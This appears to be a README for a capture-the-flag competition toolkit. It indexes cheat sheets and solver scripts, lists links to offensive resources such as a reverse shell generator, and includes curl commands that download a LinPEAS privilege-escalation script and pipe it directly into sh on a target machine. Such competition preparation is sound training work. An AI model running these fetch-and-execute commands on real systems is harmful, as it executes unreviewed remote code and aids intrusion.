# CTF Grand Final Arsenal 🏆

Fast, reliable, AI-free cheat sheets, solver scripts, and payloads for the Grand Final.

## Table of Contents
- [01-web/web_payloads.md](01-web/web_payloads.md) - SSTI, SQLi, LFI wrappers, File Upload bypass, Command Injection.
- [02-pwn/template_pwntools.py](02-pwn/template_pwntools.py) - Universal boilerplate for local & remote buffer overflows.
- [02-pwn/pwn_cheatsheet.md](02-pwn/pwn_cheatsheet.md) - GDB-pwndbg commands, cyclic offset calculation, ret2win, ROP.
- [03-reverse/reverse_cheatsheet.md](03-reverse/reverse_cheatsheet.md) - Ghidra shortcuts, ltrace/strace, UPX unpacking, pyc decompile.
- [04-crypto/rsa_solver.py](04-crypto/rsa_solver.py) - Standalone script solving common CTF RSA attacks (factordb, small e, Wiener).
- [04-crypto/crypto_cheatsheet.md](04-crypto/crypto_cheatsheet.md) - Classic ciphers, XOR scripts, hash identification, dcode.fr links.
- [05-forensics/triage_checklist.md](05-forensics/triage_checklist.md) - 10-minute triage checklist (PCAP, Stego, Hex headers, Memory).
- [06-misc/pyjail_and_sockets.md](06-misc/pyjail_and_sockets.md) - Python sandbox escape gadgets & automated socket loop solver.

---

## ⚡ 1-Second Tool Downloads for Competition Machines

When you are on an organizer Linux machine or spawned target:

```bash
# Download & run LinPEAS directly from this repo:
curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh | sh
# Or save to /tmp:
curl -sL https://raw.githubusercontent.com/klasyyi/ctf-tool/main/tools/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
```

---

## Emergency Survival Links (No AI Allowed)
1. **[dcode.fr](https://www.dcode.fr/)** — Universal crypto / cipher solver
2. **[revshells.com](https://www.revshells.com/)** — Instant reverse shell generator
3. **[CyberChef](https://gchq.github.io/CyberChef/)** — Multi-step decoder & recipe builder
4. **[factordb.com](https://factordb.com/)** — RSA N factorization database
5. **[GTFOBins](https://gtfobins.github.io/)** — Linux binary privilege escalation / command execution
6. **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** — Web and sandbox payloads
